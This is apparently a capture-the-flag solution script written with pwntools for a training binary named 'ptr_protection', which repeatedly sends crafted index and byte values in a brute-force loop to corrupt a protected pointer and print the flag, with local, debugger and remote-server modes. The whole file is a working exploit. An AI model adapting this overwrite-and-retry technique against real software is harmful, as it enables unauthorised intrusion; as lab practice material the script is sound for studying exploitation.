from pwn import *
import sys
import time

def int_to_byte(r):
	return r.to_bytes(1, byteorder='big')

context.arch = 'amd64'

exit = False
while not exit:
	if(len(sys.argv) > 1):
		if(sys.argv[1] == '--debug'):
			p = process("./ptr_protection")
			gdb.attach(p, """
			#b *challenge+98
			#b *challenge+137
			b *challenge+268
			c
			"""	)
			input("wait...")
		elif(sys.argv[1] == '--strace'):
			p = process(["strace", "./ptr_protection"])
		elif(sys.argv[1] == '--remote'):
			p = remote("bin.training.offdef.it", 4202)
	else:
		p = process("./ptr_protection")

	p.recv()
	p.sendline(b'40')
	p.recv()
	p.sendline(b'232')
	p.recv()
	p.sendline(b'41')
	p.recv()
	p.sendline(b'17')
	p.recv()

	#input('terminate now')
	p.sendline(b'-1')
	a = p.recvuntil(b'\n') # return ...
	print(a)
	try:
		flag = p.recv()
		print(flag)
		exit = True
	except:
		continue

	if(exit == True): break

p.interactive()